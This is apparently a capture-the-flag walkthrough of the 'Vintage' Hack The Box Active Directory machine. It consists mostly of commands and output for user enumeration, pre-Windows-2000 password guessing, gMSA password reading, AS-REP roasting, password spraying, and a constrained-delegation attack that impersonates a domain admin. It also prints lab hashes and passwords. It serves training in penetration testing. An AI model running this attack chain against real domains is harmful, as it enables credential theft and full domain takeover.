# Vintage (hard)

```bash
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-03 22:18:08Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 49999/tcp): CLEAN (Timeout)
|   Check 2 (port 53397/tcp): CLEAN (Timeout)
|   Check 3 (port 58741/udp): CLEAN (Timeout)
|   Check 4 (port 61163/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -7h04m45s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-01-03T22:18:16
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:18
Completed NSE at 06:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:18
Completed NSE at 06:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:18
Completed NSE at 06:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 312.79 seconds
           Raw packets sent: 2018 (88.768KB) | Rcvd: 115 (9.267KB)
```

Enum4linux wasn't working, I used ldapsearch to get all the existing usernames.

The `-x` is for the 'simple authentication', used in combinaison of the -D and the -w. The `-b` is the base search. Here, this limits the query to only objects under the domain. Then, you specify a filter, here you want all the `user` object. Then, you can filter for specific attributes. Here the unique logon of the user and the groups it belongs to.

```bash
ldapsearch -x -H ldap://"$DC_HOST" -D "$USER"@"$DOMAIN" -w "$PASSWORD" -b "DC=VINTAGE,DC=HTB" "(objectClass=user)" sAMAccountName memberOf
# extended LDIF
#
# LDAPv3
# base <DC=VINTAGE,DC=HTB> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName memberOf
#

# Administrator, Users, vintage.htb
dn: CN=Administrator,CN=Users,DC=vintage,DC=htb
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Administrator

# Guest, Users, vintage.htb
dn: CN=Guest,CN=Users,DC=vintage,DC=htb
memberOf: CN=Guests,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Guest

# DC01, Domain Controllers, vintage.htb
dn: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
sAMAccountName: DC01$

# krbtgt, Users, vintage.htb
dn: CN=krbtgt,CN=Users,DC=vintage,DC=htb
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
sAMAccountName: krbtgt

# gMSA01, Managed Service Accounts, vintage.htb
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
sAMAccountName: gMSA01$

# fs01, Computers, vintage.htb
dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: FS01$

# M.Rossi, Users, vintage.htb
dn: CN=M.Rossi,CN=Users,DC=vintage,DC=htb
sAMAccountName: M.Rossi

# R.Verdi, Users, vintage.htb
dn: CN=R.Verdi,CN=Users,DC=vintage,DC=htb
sAMAccountName: R.Verdi

# L.Bianchi, Users, vintage.htb
dn: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: L.Bianchi

# G.Viola, Users, vintage.htb
dn: CN=G.Viola,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: G.Viola

# C.Neri, Users, vintage.htb
dn: CN=C.Neri,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri

# P.Rosa, Users, vintage.htb
dn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
sAMAccountName: P.Rosa

# svc_sql, Pre-Migration, vintage.htb
dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_sql

# svc_ldap, Pre-Migration, vintage.htb
dn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ldap

# svc_ark, Pre-Migration, vintage.htb
dn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ark

# C.Neri_adm, Users, vintage.htb
dn: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri_adm

# L.Bianchi_adm, Users, vintage.htb
dn: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
sAMAccountName: L.Bianchi_adm

# search reference
ref: ldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 21
# numEntries: 17
# numReferences: 3
```

There is :

```bash
# fs01, Computers, vintage.htb
dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: FS01$
```

This might be the vintage stuff of the box. We can use pre2k to might get a valid TGT for an other user.

We first need to get all the usernames. ez with `grep sAMAccountName | {awk print $2}`

Then we run pre2k.

```bash
pre2k unauth -inputfile users.txt -d $DOMAIN -dc-ip $DC_HOST -verbose

                                ___    __
                              /'___`\ /\ \
 _____   _ __    __          /\_\ /\ \\ \ \/'\
/\ '__`\/\`'__\/'__`\ _______\/_/// /__\ \ , <
\ \ \L\ \ \ \//\  __//\______\  // /_\ \\ \ \\`\
 \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\
  \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/
   \ \_\                                      v3.0
    \/_/
                                            @garrfoster
                                            @Tw1sm

[14:46:10] INFO     Testing started at 2025-01-05 14:46:10
[14:46:10] INFO     Using 10 threads
[14:46:11] DEBUG    Invalid credentials: vintage.htb\Guest:gues
[14:46:11] DEBUG    Invalid credentials: vintage.htb\krbtgt:krbtg
[14:46:11] DEBUG    Invalid credentials: vintage.htb\R.Verdi:r.verd
[14:46:11] DEBUG    Invalid credentials: vintage.htb\DC01$:dc01
[14:46:11] DEBUG    Invalid credentials: vintage.htb\L.Bianchi:l.bianch
[14:46:11] DEBUG    Invalid credentials: vintage.htb\G.Viola:g.viol
[14:46:11] DEBUG    Invalid credentials: vintage.htb\C.Neri:c.ner
[14:46:11] DEBUG    Invalid credentials: vintage.htb\M.Rossi:m.ross
[14:46:11] DEBUG    Invalid credentials: vintage.htb\svc_sql:svc_sq
[14:46:11] DEBUG    Invalid credentials: vintage.htb\Administrator:administrato
[14:46:11] DEBUG    Invalid credentials: vintage.htb\gMSA01$:gmsa01
[14:46:11] INFO     VALID CREDENTIALS: vintage.htb\FS01$:fs01
[14:46:11] DEBUG    Invalid credentials: vintage.htb\P.Rosa:p.ros
[14:46:11] DEBUG    Invalid credentials: vintage.htb\svc_ark:svc_ar
[14:46:11] DEBUG    Invalid credentials: vintage.htb\svc_ldap:svc_lda
[14:46:11] DEBUG    Invalid credentials: vintage.htb\L.Bianchi_adm:l.bianchi_ad
[14:46:11] DEBUG    Invalid credentials: vintage.htb\C.Neri_adm:c.neri_ad
```

Great valid credentials ! We can get a TGT and then BH, we have the readGMSAPAssword

```bash
bloodyAD --host "$DC_HOST" -d "$DOMAIN" -k get object 'GMSA01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:7dc430b95e17ed6f817f69366f35be06
msDS-ManagedPassword.B64ENCODED: sfyyjet8CbAO5HFzqbtcCtYlqyYohprMvCgeztWhv4z/WOQOS1zcslIn9C3K/ucxzjDGRgHJS/1a54nxI0DxzlhZElfBxQL2z0KpRCrUNdKbdHXU/kzFj/i38JFgOWrx2FMIGKrEEIohO3b2fA/U/vlPxw65M+kY2krLxl5tfD1Un1kMCByA1AI4VuR5zxXSfpnzFIxKlo1PKBJUxttMqbRM21I5/aLQnaIDCnr3WaqfU6lLwdGWxoz6XSD3UiqLaW5iDPYYR47kJpnflJgS0TBUBkvd2JiLiOb5CXF1gBgUsbVLtBo/OWW/+lrvEpBtS7QIUFsOKMIaNsKFGtTkWQ==
```

GMSA01 can add user to Service Managers. Let's had Rose, that way she will have a generic write over multiple SVC

First we need a TGT.

```bash
getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$USER" -hashes "$HASH"
```

Then, add rose to Service Managers.

```bash
bloodyAD --host "$DC_HOST" -d "$DOMAIN" -k add groupMember SERVICEMANAGERS P.Rosa
```

I tried a first asreprosat but I got `UF_DONT_REQUIRE_PREAUTH` So I did :

```bash
KRB5CCNAME=./P.Rosa.ccache bloodyAD --host "$DC_HOST" -d "$DOMAIN" --dc-ip "$DC_IP" -k add uac svc_ark -f DONT_REQ_PREAUTH
```

for the 3 svc accounts.

But one of them had `KDC_ERR_CLIENT_REVOKED`. So I enabled the account again !

```bash
KRB5CCNAME=./P.Rosa.ccache bloodyAD --host "$DC_HOST" -d "$DOMAIN" --dc-ip "$DC_IP" -k remove uac svc_sql -f ACCOUNTDISABLE
```

Then asreproast again and Keberos tickets !

```bash
GetNPUsers.py -usersfile users.txt -request -format hashcat -dc-ip "$DC_IP" "$DOMAIN"/
Impacket v0.13.0.dev0+20240918.213844.ac790f2b - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_sql@VINTAGE.HTB:27f2bbb69cb1759b7a9f873266984ea9$cc1b4dc05a2e837fadf96e7291783ce5e69d31f329ed6d0ecf530b8db83479655bdaf4e0500891210ee2b1e78959f7fd3b55436779bfa3faffc9c68b321400d541cc5c4ce11325aec1b0f4597114b4a7f1bcd21c897700b7a98331a42a4d977317224f6b36e8940d4dfbdab92ce02349d0ce13c6821325924b5673ac58a18bff0b167dccf0e1b95424197e1908cc4ff5edd7997dd4cec781459d9b6dff4c0c50e38f2ef33e37c3dd2572d8094a4b56e829d4950c7db224e5cd0aa126a79f5ebf225789761df4febe058b63ed613909382fcdfc4fb3f49408fee414cbb7d01f609af82c00d99477a1a428
$krb5asrep$23$svc_ldap@VINTAGE.HTB:1534a4e176d1db1fc871eef6d0d42192$4ea62301b631b9f1e745921daf205ec9cac86cfa61a95f7d57ef32ae20fd79c143697558796082b193277195ce4f2a62e05a46ebd93ee2afccd578b7046c169f12d28e0e4728e73e18cb85a771a5813d8dd9d39ed1423d38e428a10e666494a55af023880528b8ac7a0bd8bcb731982fb3c10ec460d537c7bb2c798314211603cbff0722e29d02ca2011d71d7077042c5eedd8ea910af65f934f179d762188537d52315a73db5029978386b3fcd961568499813f0faa20e3a77fe48606f1cf5097e7105131de893cf0341eaf7f264274a3ef86b9ce12ab08248ff467460cd57c06de615461f18888740f
$krb5asrep$23$svc_ark@VINTAGE.HTB:a97ec079d3066caa76fe2399353e23aa$158a0a221e0113c098b279d28619eb4eb44a50b1f3e936389193406ce24c4cfe1ff27736c57152d6e851287b13151b72a4f3900357943b94222ec5538e69b681c62e2291fbb4d0f2ad0ffd96cf14146a3cc7a8c2bff09f3cd8868a2c849a06ab913383771ec65427b2d261f09301b9e9d09d8739f99c39a461bca99e498dcc978dabf27cfa4270225f651b6b7e76594069618c6e77a0518446b90b1e499c72f3626cd5361ba2ac52ef5a344117ff16f7f3fe3ba9dfbec16eb9e081e3556c4ba296878c53babcd523f662d0f1bcc0b73c032dcfaf8c4cef115ed85ae352528da83aaaf1b7dcf608ce8956
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Then I got the password for svc_sql:Zer0the0ne.

Trying for the users :

```bash
kerbrute passwordspray --domain "$DOMAIN" --dc "$DC_IP" users.txt Zer0the0ne

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 01/08/25 - Ronnie Flathers @ropnop

2025/01/08 23:12:02 >  Using KDC(s):
2025/01/08 23:12:02 >  	10.10.11.45:88

2025/01/08 23:12:02 >  [+] VALID LOGIN:	 C.Neri@vintage.htb:Zer0the0ne
2025/01/08 23:12:07 >  Done! Tested 17 logins (1 successes) in 5.212 seconds
```

Get tgt and user flag !

```bash
getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
Impacket v0.13.0.dev0+20240918.213844.ac790f2b - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in c.neri.ccache
```

Don't forget to change the /etc/krb5.conf like this :

```bash
[libdefaults]
  default_realm = VINTAGE.HTB
  ticket_lifetime = 24h
  renew_lifetime = 7d
  forwardable = true

[realms]
  VINTAGE.HTB = {
    kdc = dc01.vintage.htb
    admin_server = dc01.vintage.htb
  }

[domain_realm]
  .vintage.htb = VINTAGE.HTB
  vintage.htb = VINTAGE.HTB
```

```bash
KRB5CCNAME=./c.neri.ccache evil-winrm -i "$TARGET" -r "$DOMAIN"
```

```bash
run rhost=10.10.11.45 username=c.neri password=Zer0the0ne winrm::auth=kerberos domaincontrollerrhost=10.10.11.45 winrm::rhostname=dc01.vintage.htb domain=vintage.htb
```

Fucking impossible to get the dpapi data, got the next creds :
c.neri_adm : Uncr4ck4bl3P4ssW0rd0312

Now let's analyse the constraint rights

```bash
bloodyAD --host "$DC_HOST" --dc-ip "$DC_IP" -d "$DOMAIN" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "DELEGATEDADMINS" "SVC_SQL"
```

```bash
KRB5CCNAME=./c.neri.ccache bloodyAD --host "$DC_HOST" -d "$DOMAIN" --dc-ip "$DC_IP" -k set object "SVC_SQL" servicePrincipalName -v "cifs/fake"
```

```bash
getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
```

Client Credentials have been revoked

```bash
KRB5CCNAME=./P.Rosa.ccache bloodyAD --host "$DC_HOST" -d "$DOMAIN" --dc-ip "$DC_IP" -k remove uac svc_sql -f ACCOUNTDISABLE
```

Get TGT again.

```bash
KRB5CCNAME=./ getST.py -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip "$DC_IP" -k "$DOMAIN"/"$USER":"$PASSWORD"
```

winrm was not working, we had to user wmi
